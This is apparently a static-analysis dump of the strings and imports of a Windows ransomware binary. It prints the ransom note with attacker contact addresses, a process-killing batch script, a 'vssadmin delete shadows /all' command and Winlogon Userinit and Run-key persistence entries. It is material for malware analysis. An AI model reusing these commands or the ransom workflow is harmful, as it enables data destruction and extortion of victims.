reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40101b	0x40d0bf	string	0x401000	ComSpec
0x401076	0x40d13d	string	0x401000	SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe: \r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nExit\r\n:Kill\r\nIf "%~1"=="cmd.exe" (\r\nTaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"\r\n) Else (\r\nTaskKill /F /IM "%~1"\r\n)\r\ndel W.bat\r\nExit /B\r\n
0x401087	0x40d13d	string	0x401000	SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe: \r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nExit\r\n:Kill\r\nIf "%~1"=="cmd.exe" (\r\nTaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"\r\n) Else (\r\nTaskKill /F /IM "%~1"\r\n)\r\ndel W.bat\r\nExit /B\r\n
0x4010fc	0x40d097	string	0x4010b8	ReadMe.TxT
0x401132	0x40cac4	string	0x4010b8	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
0x401143	0x40cac4	string	0x4010b8	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
0x40144d	0x40d0af	string	0x4013df	windows
0x40150b	0x40d097	string	0x4013df	ReadMe.TxT
0x4016ff	0x40cab5	string	0x40160d	.lock
0x401754	0x401760	string	0x401718	YXI}ÍE blocks=Basic Latin,Latin-1 Supplement
0x401756	0x40c8b5	string	0x401718	\r\nthread realtime error
0x401787	0x40c8b5	string	0x401718	\r\nthread realtime error
0x40190f	0x40c8e4	string	0x4018d1	\r\nsocket error
0x401944	0x40c914	string	0x4018d1	\r\nconnect error
0x4019b7	0x40c8f3	string	0x4018d1	\r\ndownload error
0x4019d8	0x40c924	string	0x4018d1	\r\noffline
0x401a20	0x40c904	string	0x4018d1	\r\nchksumm error
0x401a39	0x40c8a3	string	0x4018d1	\r\ndownload key ok
0x401b77	0x40d684	string	0x401b71	c:\Windows\bfsvcm.exe
0x401b8c	0x40d5b4	string	0x401b71	SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
0x401b9b	0x40d69a	string	0x401b71	C:\Windows\system32\userinit.exe,
0x401ba6	0x40d69a	string	0x401b71	C:\Windows\system32\userinit.exe,
0x401baf	0x40d67a	string	0x401b71	Userinit
0x401bdf	0x40d0bf	string	0x401b71	ComSpec
0x401be9	0x40d0c7	string	0x401b71	/c del "
0x401c06	0x40d0d0	string	0x401b71	" >> NUL
0x401c42	0x401cad	string	0x401c2f	3*_^ZYX
0x401ca5	0x401cad	string	0x401c2f	3*_^ZYX
0x401cea	0x40d0bf	string	0x401cb9	ComSpec
0x401cfe	0x40d0d9	string	0x401cb9	vssadmin delete shadows /all
0x401d22	0x40d5b4	string	0x401cb9	SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
0x401d50	0x40d672	string	0x401cb9	Hacked
0x401dc9	0x40d672	string	0x401cb9	Hacked
0x401ddf	0x40cac4	string	0x401cb9	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
0x401de9	0x40cac4	string	0x401cb9	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: enigmax_x@aol.com or enigmax_x@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
0x401dfb	0x40c985	string	0x401cb9	ID: SfplHinIptOwnboa
0x401e10	0x40d5ea	string	0x401cb9	Software\Microsoft\Windows NT\CurrentVersion
0x401e3e	0x40d64e	string	0x401cb9	ProductName
0x401e54	0x40d65a	string	0x401cb9	Windows version unknown
0x401f16	0x40d75a	string	0x401cb9	Attention!!! Your files are encrypted !!!
0x401f21	0x40d75a	string	0x401cb9	Attention!!! Your files are encrypted !!!
0x401f2a	0x40d71e	string	0x401cb9	LegalNoticeCaption
0x401f40	0x40d784	string	0x401cb9	To recover files, follow the prompts in the text file "Readme"
0x401f4b	0x40d784	string	0x401cb9	To recover files, follow the prompts in the text file "Readme"
0x401f54	0x40d74a	string	0x401cb9	LegalNoticeText
0x401f67	0x40d6bd	string	0x401cb9	C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
0x401f72	0x40d6bd	string	0x401cb9	C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
0x401f7b	0x40d67a	string	0x401cb9	Userinit
0x401fa1	0x40d617	string	0x401cb9	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
0x401fb6	0x40d6f6	string	0x401cb9	"c:\Windows\notepad.exe" c:\ReadMe.TxT
0x401fc1	0x40d6f6	string	0x401cb9	"c:\Windows\notepad.exe" c:\ReadMe.TxT
0x401fca	0x40d646	string	0x401cb9	unlock
0x401fdb	0x40c8cd	string	0x401cb9	\r\nrun as administrator
0x40201e	0x40d684	string	0x401ff9	c:\Windows\bfsvcm.exe
0x40202e	0x40d684	string	0x401ff9	c:\Windows\bfsvcm.exe
0x4020f7	0x40d5b4	string	0x4020db	SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
0x402111	0x40d672	string	0x4020db	Hacked
0x4021a1	0x40c94d	string	0x402169	memory error\r\n
0x4021b4	0x40c93e	string	0x402169	privelege no\r\n
0x4021c9	0x40c92e	string	0x402169	privelege yes\r\n
0x402234	0x40c95c	string	0x402169	\r\n : usb
0x402287	0x40c804	string	0x402169	files\r\n skip files\r\n files/s\r\n s\r\n treads\r\nnetwork \r\n
0x4023f8	0x40c804	string	0x4023ce	files\r\n skip files\r\n files/s\r\n s\r\n treads\r\nnetwork \r\n
0x40240e	0x4030f4	import	0x40240e	user32.dll.DialogBoxParamA
0x402414	0x4030ec	import	0x402414	user32.dll.EndDialog
0x40241a	0x4030e8	import	0x40241a	user32.dll.GetDlgItem
0x402420	0x4030f8	import	0x402420	user32.dll.SendMessageA
0x402426	0x4030e4	import	0x402426	user32.dll.SetTimer
0x40242c	0x4030f0	import	0x40242c	user32.dll.ShowWindow
0x402432	0x403030	import	0x402432	kernel32.dll.CloseHandle
0x402438	0x403020	import	0x402438	kernel32.dll.CopyFileA
0x40243e	0x403024	import	0x40243e	kernel32.dll.CreateFileA
0x402444	0x403028	import	0x402444	kernel32.dll.CreateFileMappingA
0x40244a	0x40302c	import	0x40244a	kernel32.dll.CreateFileW
0x402450	0x403048	import	0x402450	kernel32.dll.CreateThread
0x402456	0x403034	import	0x402456	kernel32.dll.DeleteFileA
0x40245c	0x403038	import	0x40245c	kernel32.dll.ExitProcess
0x402462	0x40303c	import	0x402462	kernel32.dll.FindClose
0x402468	0x403040	import	0x402468	kernel32.dll.FindFirstFileW
0x40246e	0x403044	import	0x40246e	kernel32.dll.FindNextFileW
0x402474	0x403090	import	0x402474	kernel32.dll.GetCurrentProcessId
0x40247a	0x40304c	import	0x40247a	kernel32.dll.GetEnvironmentVariableA
0x402480	0x403050	import	0x402480	kernel32.dll.GetFileAttributesW
0x402486	0x403054	import	0x402486	kernel32.dll.GetLogicalDrives
0x40248c	0x403058	import	0x40248c	kernel32.dll.GetModuleFileNameA
0x402492	0x40305c	import	0x402492	kernel32.dll.GetModuleHandleA
0x402498	0x403060	import	0x402498	kernel32.dll.GetTickCount
0x40249e	0x403064	import	0x40249e	kernel32.dll.GlobalAlloc
0x4024a4	0x403068	import	0x4024a4	kernel32.dll.GlobalFree
0x4024aa	0x40306c	import	0x4024aa	kernel32.dll.MapViewOfFile
0x4024b0	0x403070	import	0x4024b0	kernel32.dll.MoveFileW
0x4024b6	0x403074	import	0x4024b6	kernel32.dll.MultiByteToWideChar
0x4024bc	0x403078	import	0x4024bc	kernel32.dll.RtlMoveMemory
0x4024c2	0x40307c	import	0x4024c2	kernel32.dll.SetErrorMode
0x4024c8	0x403080	import	0x4024c8	kernel32.dll.SetFileAttributesW
0x4024ce	0x403084	import	0x4024ce	kernel32.dll.SetThreadPriority
0x4024d4	0x403088	import	0x4024d4	kernel32.dll.Sleep
0x4024da	0x40308c	import	0x4024da	kernel32.dll.UnmapViewOfFile
0x4024e0	0x4030bc	import	0x4024e0	kernel32.dll.VirtualAlloc
0x4024e6	0x403094	import	0x4024e6	kernel32.dll.WriteFile
0x4024ec	0x403098	import	0x4024ec	kernel32.dll.lstrcatA
0x4024f2	0x40309c	import	0x4024f2	kernel32.dll.lstrcatW
0x4024f8	0x4030a0	import	0x4024f8	kernel32.dll.lstrcmpW
0x4024fe	0x4030a4	import	0x4024fe	kernel32.dll.lstrcmpiA
0x402504	0x4030a8	import	0x402504	kernel32.dll.lstrcmpiW
0x40250a	0x4030ac	import	0x40250a	kernel32.dll.lstrcpyA
0x402510	0x4030b0	import	0x402510	kernel32.dll.lstrcpyW
0x402516	0x4030b4	import	0x402516	kernel32.dll.lstrlenA
0x40251c	0x4030b8	import	0x40251c	kernel32.dll.lstrlenW
0x402522	0x4030d4	import	0x402522	shell32.dll.ShellExecuteA
0x402528	0x403000	import	0x402528	advapi32.dll.GetUserNameA
0x40252e	0x403004	import	0x40252e	advapi32.dll.RegCloseKey
0x402534	0x403008	import	0x402534	advapi32.dll.RegOpenKeyExA
0x40253a	0x403010	import	0x40253a	advapi32.dll.RegQueryValueExA
0x402540	0x40300c	import	0x402540	advapi32.dll.RegSetValueExA
0x402546	0x4030dc	import	0x402546	shlwapi.dll.PathRemoveFileSpecA
0x40254c	0x403018	import	0x40254c	comctl32.dll.InitCommonControls
0x402552	0x4030c4	import	0x402552	mpr.dll.WNetCloseEnum
0x402558	0x4030cc	import	0x402558	mpr.dll.WNetEnumResourceA
0x40255e	0x4030c8	import	0x40255e	mpr.dll.WNetOpenEnumA
0x402564	0x403118	import	0x402564	wsock32.dll.WSACleanup
0x40256a	0x403100	import	0x40256a	wsock32.dll.WSAStartup
0x402570	0x403104	import	0x402570	wsock32.dll.closesocket
0x402576	0x403108	import	0x402576	wsock32.dll.connect
0x40257c	0x40310c	import	0x40257c	wsock32.dll.recv
0x402582	0x403110	import	0x402582	wsock32.dll.send
0x402588	0x403114	import	0x402588	wsock32.dll.socket
